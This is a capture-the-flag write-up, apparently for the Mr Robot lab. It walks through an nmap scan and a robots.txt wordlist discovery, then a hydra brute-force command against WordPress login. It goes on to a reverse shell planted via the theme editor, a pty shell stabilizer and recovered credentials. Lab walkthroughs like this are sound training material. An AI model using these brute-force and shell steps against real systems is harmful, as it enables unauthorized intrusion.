```bash

$ nmap -sCV 10.10.203.12

```

result of the scan

- from our result we found out we have two http port open  `80/443` and closed ssh port `22` closed

which can be preview on web browser ![link](http://10.10.203.12/)

with manual recon i find /robots.txt

![](<img src=../../../../assets/images/mr-robot/mr_robots_robots.png>)

- upon navigating to the `/robots.txt` Directory i found two entries `fsocity.dic` and `the first key` 

- i `wget` the wordlist to download it to my machine

- moving on to the second more valuable directory found fom earlier fuzzing `/wp-login.php` 

```bash

hydra -l Elliot -P ./fsocity.dic 10.10.33.130 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username" -t 30

```

result `ER28-0652` as the password

- To exploit this, we need our to be upload to the machine so we can have a reverse shell

`http://IP/wp-admin/theme-editor.php?file=archive.php&theme=twentyfifteen`

- but make sure your listener is ready to catch the shell on the specified port.

stabilize shell:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

So we donâ€™t have permissions to check if we can run something as sudo. Letâ€™s check this password file that it is in the robot directory:

- After a couple of seconds, we got ourselves a new set of credentials:

```bash

username: robot
password: abcdefghijklmnopqrstuvwxyz

```

login and get your flag
